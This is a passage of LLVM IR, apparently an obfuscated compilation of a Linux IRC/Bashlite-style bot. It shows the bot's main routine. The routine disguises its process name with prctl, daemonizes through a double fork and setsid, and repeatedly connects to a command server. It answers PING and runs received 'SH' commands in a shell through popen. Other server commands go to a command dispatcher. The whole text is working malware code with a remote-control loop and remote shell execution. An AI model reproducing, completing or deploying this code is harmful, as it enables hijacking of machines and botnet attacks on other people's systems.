  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.117, i32 0, i32 0)) #2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %21 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i32 0, i32 0
  store i32 %19, i32* %21, align 4
  %22 = call zeroext i16 @htons(i16 zeroext 53) #13
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %26 = call i32 @connect(i32 %24, %struct.sockaddr* %25, i32 16)
  store i32 %26, i32* %4, align 4
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %16
  store i32 0, i32* %1, align 4
  br label %103

; <label>:30:                                     ; preds = %16
  store i32 16, i32* %6, align 4
  %31 = load i32, i32* %2, align 4
  %32 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %33 = call i32 @getsockname(i32 %31, %struct.sockaddr* %32, i32* %6) #2
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %30
  store i32 0, i32* %1, align 4
  br label %103

; <label>:37:                                     ; preds = %30
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %39 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 4
  store i32 %40, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %41 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.118, i32 0, i32 0), i32 0)
  store i32 %41, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %63, %37
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %44 = load i32, i32* %7, align 4
  %45 = call i8* @fdgets(i8* %43, i32 4096, i32 %44)
  %46 = icmp ne i8* %45, null
  br i1 %46, label %47, label %65

; <label>:47:                                     ; preds = %42
  %48 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %49 = call i8* @strstr(i8* %48, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.119, i32 0, i32 0)) #10
  %50 = icmp ne i8* %49, null
  br i1 %50, label %51, label %63

; <label>:51:                                     ; preds = %47
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %52, i8** %9, align 8
  br label %53

; <label>:53:                                     ; preds = %58, %51
  %54 = load i8*, i8** %9, align 8
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp ne i32 %56, 9
  br i1 %57, label %58, label %61

; <label>:58:                                     ; preds = %53
  %59 = load i8*, i8** %9, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %9, align 8
  br label %53

; <label>:61:                                     ; preds = %53
  %62 = load i8*, i8** %9, align 8
  store i8 0, i8* %62, align 1
  br label %65

; <label>:63:                                     ; preds = %47
  %64 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %64, i8 0, i64 4096, i32 16, i1 false)
  br label %42

; <label>:65:                                     ; preds = %61, %42
  %66 = load i32, i32* %7, align 4
  %67 = call i32 @close(i32 %66)
  %68 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %69 = load i8, i8* %68, align 16
  %70 = icmp ne i8 %69, 0
  br i1 %70, label %71, label %100

; <label>:71:                                     ; preds = %65
  %72 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %73 = bitcast %union.anon.6* %72 to [16 x i8]*
  %74 = getelementptr inbounds [16 x i8], [16 x i8]* %73, i32 0, i32 0
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %76 = call i8* @strcpy(i8* %74, i8* %75) #2
  %77 = load i32, i32* %2, align 4
  %78 = call i32 (i32, i64, ...) @ioctl(i32 %77, i64 35111, %struct.ifreq* %11) #2
  store i32 0, i32* %10, align 4
  br label %79

; <label>:79:                                     ; preds = %94, %71
  %80 = load i32, i32* %10, align 4
  %81 = icmp slt i32 %80, 6
  br i1 %81, label %82, label %99

; <label>:82:                                     ; preds = %79
  %83 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %84 = bitcast %union.anon.7* %83 to %struct.sockaddr*
  %85 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %84, i32 0, i32 1
  %86 = getelementptr inbounds [14 x i8], [14 x i8]* %85, i32 0, i32 0
  %87 = load i32, i32* %10, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8, i8* %86, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = load i32, i32* %10, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %92
  store i8 %90, i8* %93, align 1
  br label %94

; <label>:94:                                     ; preds = %82
  %95 = load i32, i32* %10, align 4
  %96 = sub i32 0, 1
  %97 = sub i32 %95, %96
  %98 = add nsw i32 %95, 1
  store i32 %97, i32* %10, align 4
  br label %79

; <label>:99:                                     ; preds = %79
  br label %100

; <label>:100:                                    ; preds = %99, %65
  %101 = load i32, i32* %2, align 4
  %102 = call i32 @close(i32 %101)
  br label %103

; <label>:103:                                    ; preds = %100, %36, %29, %15
  %104 = load i32, i32* %1, align 4
  ret i32 %104
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.120, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [1024 x i8], align 16
  %20 = alloca i32, align 4
  %21 = alloca [10 x i8*], align 16
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.121, i32 0, i32 0), i8** %6, align 8
  %25 = call i8* @getBuild()
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.122, i32 0, i32 0), i8* %25)
  %27 = load i8**, i8*** %5, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 0
  %29 = load i8*, i8** %28, align 8
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 0
  %32 = load i8*, i8** %31, align 8
  %33 = call i64 @strlen(i8* %32) #10
  %34 = call i8* @strncpy(i8* %29, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.123, i32 0, i32 0), i64 %33) #2
  %35 = load i8**, i8*** %5, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 0
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.121, i32 0, i32 0), i8** %36, align 8
  %37 = load i8*, i8** %6, align 8
  %38 = ptrtoint i8* %37 to i64
  %39 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %38, i32 0, i32 0, i32 0)
  %40 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %41 = call i32 @getpid() #2
  %42 = xor i32 %40, -1
  %43 = and i32 %41, %42
  %44 = xor i32 %41, -1
  %45 = and i32 %40, %44
  %46 = or i32 %43, %45
  %47 = xor i32 %40, %41
  call void @srand(i32 %46) #2
  %48 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %49 = call i32 @getpid() #2
  %50 = xor i32 %48, -1
  %51 = and i32 764598301, %50
  %52 = xor i32 764598301, -1
  %53 = and i32 %48, %52
  %54 = xor i32 %49, -1
  %55 = and i32 %54, 764598301
  %56 = and i32 %49, %52
  %57 = or i32 %51, %53
  %58 = or i32 %55, %56
  %59 = xor i32 %57, %58
  %60 = xor i32 %48, %49
  call void @init_rand(i32 %59)
  %61 = call i32 @getOurIP()
  %62 = call i32 @fork() #2
  store i32 %62, i32* %7, align 4
  %63 = icmp ne i32 %62, 0
  br i1 %63, label %64, label %67

; <label>:64:                                     ; preds = %2
  %65 = load i32, i32* %7, align 4
  %66 = call i32 @waitpid(i32 %65, i32* %9, i32 0)
  call void @exit(i32 0) #14
  unreachable

; <label>:67:                                     ; preds = %2
  %68 = load i32, i32* %7, align 4
  %69 = icmp ne i32 %68, 0
  br i1 %69, label %81, label %70

; <label>:70:                                     ; preds = %67
  %71 = call i32 @fork() #2
  store i32 %71, i32* %8, align 4
  %72 = icmp ne i32 %71, 0
  br i1 %72, label %73, label %74

; <label>:73:                                     ; preds = %70
  call void @exit(i32 0) #14
  unreachable

; <label>:74:                                     ; preds = %70
  %75 = load i32, i32* %8, align 4
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %78, label %77

; <label>:77:                                     ; preds = %74
  br label %79

; <label>:78:                                     ; preds = %74
  br label %79

; <label>:79:                                     ; preds = %78, %77
  br label %80

; <label>:80:                                     ; preds = %79
  br label %82

; <label>:81:                                     ; preds = %67
  br label %82

; <label>:82:                                     ; preds = %81, %80
  br label %83

; <label>:83:                                     ; preds = %82
  %84 = call i32 @setsid() #2
  %85 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.124, i32 0, i32 0)) #2
  %86 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  br label %87

; <label>:87:                                     ; preds = %425, %90, %83
  %88 = call i32 @initConnection()
  %89 = icmp ne i32 %88, 0
  br i1 %89, label %90, label %92

; <label>:90:                                     ; preds = %87
  %91 = call i32 @sleep(i32 5)
  br label %87

; <label>:92:                                     ; preds = %87
  %93 = load i32, i32* @mainCommSock, align 4
  %94 = call i8* @getBuild()
  %95 = call i32 (i32, i8*, ...) @sockprintf(i32 %93, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.125, i32 0, i32 0), i8* %94)
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  br label %96

; <label>:96:                                     ; preds = %424, %335, %248, %210, %92
  %97 = load i32, i32* @mainCommSock, align 4
  %98 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %99 = call i32 @recvLine(i32 %97, i8* %98, i32 4096)
  store i32 %99, i32* %11, align 4
  %100 = icmp ne i32 %99, -1
  br i1 %100, label %101, label %425

; <label>:101:                                    ; preds = %96
  store i32 0, i32* %12, align 4
  br label %102

; <label>:102:                                    ; preds = %195, %101
  %103 = load i32, i32* %12, align 4
  %104 = sext i32 %103 to i64
  %105 = load i64, i64* @numpids, align 8
  %106 = icmp ult i64 %104, %105
  br i1 %106, label %107, label %201

; <label>:107:                                    ; preds = %102
  %108 = load i32*, i32** @pids, align 8
  %109 = load i32, i32* %12, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds i32, i32* %108, i64 %110
  %112 = load i32, i32* %111, align 4
  %113 = call i32 @waitpid(i32 %112, i32* null, i32 1)
  %114 = icmp sgt i32 %113, 0
  br i1 %114, label %115, label %194

; <label>:115:                                    ; preds = %107
  %116 = load i32, i32* %12, align 4
  %117 = sub i32 0, %116
  %118 = sub i32 0, 1
  %119 = add i32 %117, %118
  %120 = sub i32 0, %119
  %121 = add nsw i32 %116, 1
  store i32 %120, i32* %14, align 4
  br label %122

; <label>:122:                                    ; preds = %141, %115
  %123 = load i32, i32* %14, align 4
  %124 = zext i32 %123 to i64
  %125 = load i64, i64* @numpids, align 8
  %126 = icmp ult i64 %124, %125
  br i1 %126, label %127, label %147

; <label>:127:                                    ; preds = %122
  %128 = load i32*, i32** @pids, align 8
  %129 = load i32, i32* %14, align 4
  %130 = zext i32 %129 to i64
  %131 = getelementptr inbounds i32, i32* %128, i64 %130
  %132 = load i32, i32* %131, align 4
  %133 = load i32*, i32** @pids, align 8
  %134 = load i32, i32* %14, align 4
  %135 = add i32 %134, -1073612077
  %136 = sub i32 %135, 1
  %137 = sub i32 %136, -1073612077
  %138 = sub i32 %134, 1
  %139 = zext i32 %137 to i64
  %140 = getelementptr inbounds i32, i32* %133, i64 %139
  store i32 %132, i32* %140, align 4
  br label %141

; <label>:141:                                    ; preds = %127
  %142 = load i32, i32* %14, align 4
  %143 = sub i32 %142, 286362537
  %144 = add i32 %143, 1
  %145 = add i32 %144, 286362537
  %146 = add i32 %142, 1
  store i32 %145, i32* %14, align 4
  br label %122

; <label>:147:                                    ; preds = %122
  %148 = load i32*, i32** @pids, align 8
  %149 = load i32, i32* %14, align 4
  %150 = sub i32 0, 1
  %151 = add i32 %149, %150
  %152 = sub i32 %149, 1
  %153 = zext i32 %151 to i64
  %154 = getelementptr inbounds i32, i32* %148, i64 %153
  store i32 0, i32* %154, align 4
  %155 = load i64, i64* @numpids, align 8
  %156 = sub i64 0, %155
  %157 = sub i64 0, -1
  %158 = add i64 %156, %157
  %159 = sub i64 0, %158
  %160 = add i64 %155, -1
  store i64 %159, i64* @numpids, align 8
  %161 = load i64, i64* @numpids, align 8
  %162 = add i64 %161, 3147487048756030879
  %163 = add i64 %162, 1
  %164 = sub i64 %163, 3147487048756030879
  %165 = add i64 %161, 1
  %166 = mul i64 %164, 4
  %167 = call noalias i8* @malloc(i64 %166) #2
  %168 = bitcast i8* %167 to i32*
  store i32* %168, i32** %13, align 8
  store i32 0, i32* %14, align 4
  br label %169

; <label>:169:                                    ; preds = %184, %147
  %170 = load i32, i32* %14, align 4
  %171 = zext i32 %170 to i64
  %172 = load i64, i64* @numpids, align 8
  %173 = icmp ult i64 %171, %172
  br i1 %173, label %174, label %190

; <label>:174:                                    ; preds = %169
  %175 = load i32*, i32** @pids, align 8
  %176 = load i32, i32* %14, align 4
  %177 = zext i32 %176 to i64
  %178 = getelementptr inbounds i32, i32* %175, i64 %177
  %179 = load i32, i32* %178, align 4
  %180 = load i32*, i32** %13, align 8
  %181 = load i32, i32* %14, align 4
  %182 = zext i32 %181 to i64
  %183 = getelementptr inbounds i32, i32* %180, i64 %182
  store i32 %179, i32* %183, align 4
  br label %184

; <label>:184:                                    ; preds = %174
  %185 = load i32, i32* %14, align 4
  %186 = add i32 %185, 63976438
  %187 = add i32 %186, 1
  %188 = sub i32 %187, 63976438
  %189 = add i32 %185, 1
  store i32 %188, i32* %14, align 4
  br label %169

; <label>:190:                                    ; preds = %169
  %191 = load i32*, i32** @pids, align 8
  %192 = bitcast i32* %191 to i8*
  call void @free(i8* %192) #2
  %193 = load i32*, i32** %13, align 8
  store i32* %193, i32** @pids, align 8
  br label %194

; <label>:194:                                    ; preds = %190, %107
  br label %195

; <label>:195:                                    ; preds = %194
  %196 = load i32, i32* %12, align 4
  %197 = add i32 %196, -1602782168
  %198 = add i32 %197, 1
  %199 = sub i32 %198, -1602782168
  %200 = add nsw i32 %196, 1
  store i32 %199, i32* %12, align 4
  br label %102

; <label>:201:                                    ; preds = %102
  %202 = load i32, i32* %11, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %203
  store i8 0, i8* %204, align 1
  %205 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %205)
  %206 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %207 = call i8* @strstr(i8* %206, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.71, i32 0, i32 0)) #10
  %208 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %209 = icmp eq i8* %207, %208
  br i1 %209, label %210, label %213

; <label>:210:                                    ; preds = %201
  %211 = load i32, i32* @mainCommSock, align 4
  %212 = call i32 (i32, i8*, ...) @sockprintf(i32 %211, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.126, i32 0, i32 0))
  br label %96

; <label>:213:                                    ; preds = %201
  %214 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %215 = call i8* @strstr(i8* %214, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.127, i32 0, i32 0)) #10
  %216 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %217 = icmp eq i8* %215, %216
  br i1 %217, label %218, label %219

; <label>:218:                                    ; preds = %213
  call void @exit(i32 0) #14
  unreachable

; <label>:219:                                    ; preds = %213
  %220 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %220, i8** %15, align 8
  %221 = load i8*, i8** %15, align 8
  %222 = load i8, i8* %221, align 1
  %223 = zext i8 %222 to i32
  %224 = icmp eq i32 %223, 33
  br i1 %224, label %225, label %424

; <label>:225:                                    ; preds = %219
  %226 = load i8*, i8** %15, align 8
  %227 = getelementptr inbounds i8, i8* %226, i64 1
  store i8* %227, i8** %16, align 8
  br label %228

; <label>:228:                                    ; preds = %240, %225
  %229 = load i8*, i8** %16, align 8
  %230 = load i8, i8* %229, align 1
  %231 = zext i8 %230 to i32
  %232 = icmp ne i32 %231, 32
  br i1 %232, label %233, label %238

; <label>:233:                                    ; preds = %228
  %234 = load i8*, i8** %16, align 8
  %235 = load i8, i8* %234, align 1
  %236 = zext i8 %235 to i32
  %237 = icmp ne i32 %236, 0
  br label %238

; <label>:238:                                    ; preds = %233, %228
  %239 = phi i1 [ false, %228 ], [ %237, %233 ]
  br i1 %239, label %240, label %243

; <label>:240:                                    ; preds = %238
  %241 = load i8*, i8** %16, align 8
  %242 = getelementptr inbounds i8, i8* %241, i32 1
  store i8* %242, i8** %16, align 8
  br label %228

; <label>:243:                                    ; preds = %238
  %244 = load i8*, i8** %16, align 8
  %245 = load i8, i8* %244, align 1
  %246 = zext i8 %245 to i32
  %247 = icmp eq i32 %246, 0
  br i1 %247, label %248, label %249

; <label>:248:                                    ; preds = %243
  br label %96

; <label>:249:                                    ; preds = %243
  %250 = load i8*, i8** %16, align 8
  store i8 0, i8* %250, align 1
  %251 = load i8*, i8** %15, align 8
  %252 = getelementptr inbounds i8, i8* %251, i64 1
  store i8* %252, i8** %16, align 8
  %253 = load i8*, i8** %15, align 8
  %254 = load i8*, i8** %16, align 8
  %255 = call i64 @strlen(i8* %254) #10
  %256 = getelementptr inbounds i8, i8* %253, i64 %255
  %257 = getelementptr inbounds i8, i8* %256, i64 2
  store i8* %257, i8** %15, align 8
  br label %258

; <label>:258:                                    ; preds = %284, %249
  %259 = load i8*, i8** %15, align 8
  %260 = load i8*, i8** %15, align 8
  %261 = call i64 @strlen(i8* %260) #10
  %262 = sub i64 %261, -7723536275419722856
  %263 = sub i64 %262, 1
  %264 = add i64 %263, -7723536275419722856
  %265 = sub i64 %261, 1
  %266 = getelementptr inbounds i8, i8* %259, i64 %264
  %267 = load i8, i8* %266, align 1
  %268 = zext i8 %267 to i32
  %269 = icmp eq i32 %268, 10
  br i1 %269, label %282, label %270

; <label>:270:                                    ; preds = %258
  %271 = load i8*, i8** %15, align 8
  %272 = load i8*, i8** %15, align 8
  %273 = call i64 @strlen(i8* %272) #10
  %274 = sub i64 %273, -1166114259454464916
  %275 = sub i64 %274, 1
  %276 = add i64 %275, -1166114259454464916
  %277 = sub i64 %273, 1
  %278 = getelementptr inbounds i8, i8* %271, i64 %276
  %279 = load i8, i8* %278, align 1
  %280 = zext i8 %279 to i32
  %281 = icmp eq i32 %280, 13
  br label %282

; <label>:282:                                    ; preds = %270, %258
  %283 = phi i1 [ true, %258 ], [ %281, %270 ]
  br i1 %283, label %284, label %293

; <label>:284:                                    ; preds = %282
  %285 = load i8*, i8** %15, align 8
  %286 = load i8*, i8** %15, align 8
  %287 = call i64 @strlen(i8* %286) #10
  %288 = add i64 %287, -7451895149428987644
  %289 = sub i64 %288, 1
  %290 = sub i64 %289, -7451895149428987644
  %291 = sub i64 %287, 1
  %292 = getelementptr inbounds i8, i8* %285, i64 %290
  store i8 0, i8* %292, align 1
  br label %258

; <label>:293:                                    ; preds = %282
  %294 = load i8*, i8** %15, align 8
  store i8* %294, i8** %17, align 8
  br label %295

; <label>:295:                                    ; preds = %307, %293
  %296 = load i8*, i8** %15, align 8
  %297 = load i8, i8* %296, align 1
  %298 = zext i8 %297 to i32
  %299 = icmp ne i32 %298, 32
  br i1 %299, label %300, label %305

; <label>:300:                                    ; preds = %295
  %301 = load i8*, i8** %15, align 8
  %302 = load i8, i8* %301, align 1
  %303 = zext i8 %302 to i32
  %304 = icmp ne i32 %303, 0
  br label %305

; <label>:305:                                    ; preds = %300, %295
  %306 = phi i1 [ false, %295 ], [ %304, %300 ]
  br i1 %306, label %307, label %310

; <label>:307:                                    ; preds = %305
  %308 = load i8*, i8** %15, align 8
  %309 = getelementptr inbounds i8, i8* %308, i32 1
  store i8* %309, i8** %15, align 8
  br label %295

; <label>:310:                                    ; preds = %305
  %311 = load i8*, i8** %15, align 8
  store i8 0, i8* %311, align 1
  %312 = load i8*, i8** %15, align 8
  %313 = getelementptr inbounds i8, i8* %312, i32 1
  store i8* %313, i8** %15, align 8
  %314 = load i8*, i8** %17, align 8
  store i8* %314, i8** %18, align 8
  br label %315

; <label>:315:                                    ; preds = %319, %310
  %316 = load i8*, i8** %18, align 8
  %317 = load i8, i8* %316, align 1
  %318 = icmp ne i8 %317, 0
  br i1 %318, label %319, label %328

; <label>:319:                                    ; preds = %315
  %320 = load i8*, i8** %18, align 8
  %321 = load i8, i8* %320, align 1
  %322 = zext i8 %321 to i32
  %323 = call i32 @toupper(i32 %322) #10
  %324 = trunc i32 %323 to i8
  %325 = load i8*, i8** %18, align 8
  store i8 %324, i8* %325, align 1
  %326 = load i8*, i8** %18, align 8
  %327 = getelementptr inbounds i8, i8* %326, i32 1
  store i8* %327, i8** %18, align 8
  br label %315

; <label>:328:                                    ; preds = %315
  %329 = load i8*, i8** %17, align 8
  %330 = call i32 @strcmp(i8* %329, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.128, i32 0, i32 0)) #10
  %331 = icmp eq i32 %330, 0
  br i1 %331, label %332, label %355

; <label>:332:                                    ; preds = %328
  %333 = call i32 @listFork()
  %334 = icmp ne i32 %333, 0
  br i1 %334, label %335, label %336

; <label>:335:                                    ; preds = %332
  br label %96

; <label>:336:                                    ; preds = %332
  %337 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %337, i8 0, i64 1024, i32 16, i1 false)
  %338 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %339 = load i8*, i8** %15, align 8
  %340 = call i32 (i8*, i8*, ...) @szprintf(i8* %338, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.129, i32 0, i32 0), i8* %339)
  %341 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %342 = call i32 @fdpopen(i8* %341, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.130, i32 0, i32 0))
  store i32 %342, i32* %20, align 4
  br label %343

; <label>:343:                                    ; preds = %348, %336
  %344 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %345 = load i32, i32* %20, align 4
  %346 = call i8* @fdgets(i8* %344, i32 1024, i32 %345)
  %347 = icmp ne i8* %346, null
  br i1 %347, label %348, label %352

; <label>:348:                                    ; preds = %343
  %349 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @trim(i8* %349)
  %350 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %350, i8 0, i64 1024, i32 16, i1 false)
  %351 = call i32 @sleep(i32 1)
  br label %343

; <label>:352:                                    ; preds = %343
  %353 = load i32, i32* %20, align 4
  %354 = call i32 @fdpclose(i32 %353)
  call void @exit(i32 0) #14
  unreachable

; <label>:355:                                    ; preds = %328
  store i32 1, i32* %22, align 4
  %356 = load i8*, i8** %15, align 8
  %357 = call i8* @strtok(i8* %356, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.131, i32 0, i32 0)) #2
  store i8* %357, i8** %23, align 8
  %358 = load i8*, i8** %17, align 8
  %359 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 0
  store i8* %358, i8** %359, align 16
  br label %360

; <label>:360:                                    ; preds = %398, %355
  %361 = load i8*, i8** %23, align 8
  %362 = icmp ne i8* %361, null
  br i1 %362, label %363, label %400

; <label>:363:                                    ; preds = %360
  %364 = load i8*, i8** %23, align 8
  %365 = load i8, i8* %364, align 1
  %366 = zext i8 %365 to i32
  %367 = icmp ne i32 %366, 10
  br i1 %367, label %368, label %398

; <label>:368:                                    ; preds = %363
  %369 = load i8*, i8** %23, align 8
  %370 = call i64 @strlen(i8* %369) #10
  %371 = sub i64 0, 1
  %372 = sub i64 %370, %371
  %373 = add i64 %370, 1
  %374 = call noalias i8* @malloc(i64 %372) #2
  %375 = load i32, i32* %22, align 4
  %376 = sext i32 %375 to i64
  %377 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %376
  store i8* %374, i8** %377, align 8
  %378 = load i32, i32* %22, align 4
  %379 = sext i32 %378 to i64
  %380 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %379
  %381 = load i8*, i8** %380, align 8
  %382 = load i8*, i8** %23, align 8
  %383 = call i64 @strlen(i8* %382) #10
  %384 = sub i64 0, 1
  %385 = sub i64 %383, %384
  %386 = add i64 %383, 1
  call void @llvm.memset.p0i8.i64(i8* %381, i8 0, i64 %385, i32 1, i1 false)
  %387 = load i32, i32* %22, align 4
  %388 = sext i32 %387 to i64
  %389 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %388
  %390 = load i8*, i8** %389, align 8
  %391 = load i8*, i8** %23, align 8
  %392 = call i8* @strcpy(i8* %390, i8* %391) #2
  %393 = load i32, i32* %22, align 4
  %394 = sub i32 %393, 1072855437
  %395 = add i32 %394, 1
  %396 = add i32 %395, 1072855437
  %397 = add nsw i32 %393, 1
  store i32 %396, i32* %22, align 4
  br label %398

; <label>:398:                                    ; preds = %368, %363
  %399 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.131, i32 0, i32 0)) #2
  store i8* %399, i8** %23, align 8
  br label %360

; <label>:400:                                    ; preds = %360
  %401 = load i32, i32* %22, align 4
  %402 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i32 0, i32 0
  call void @processCmd(i32 %401, i8** %402)
  %403 = load i32, i32* %22, align 4
  %404 = icmp sgt i32 %403, 1
  br i1 %404, label %405, label %423

; <label>:405:                                    ; preds = %400
  store i32 1, i32* %24, align 4
  store i32 1, i32* %24, align 4
  br label %406

; <label>:406:                                    ; preds = %415, %405
  %407 = load i32, i32* %24, align 4
  %408 = load i32, i32* %22, align 4
  %409 = icmp slt i32 %407, %408
  br i1 %409, label %410, label %422

; <label>:410:                                    ; preds = %406
  %411 = load i32, i32* %24, align 4
  %412 = sext i32 %411 to i64
  %413 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %412
  %414 = load i8*, i8** %413, align 8
  call void @free(i8* %414) #2
  br label %415

; <label>:415:                                    ; preds = %410
  %416 = load i32, i32* %24, align 4
  %417 = sub i32 0, %416
  %418 = sub i32 0, 1
  %419 = add i32 %417, %418
  %420 = sub i32 0, %419
  %421 = add nsw i32 %416, 1
  store i32 %420, i32* %24, align 4
  br label %406

; <label>:422:                                    ; preds = %406
  br label %423

; <label>:423:                                    ; preds = %422, %400
  br label %424

; <label>:424:                                    ; preds = %423, %219
  br label %96

; <label>:425:                                    ; preds = %96
  br label %87
                                                  ; No predecessors!
  %427 = load i32, i32* %3, align 4
  ret i32 %427
}

declare i32 @printf(i8*, ...) #3

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #4

declare i32 @prctl(...) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

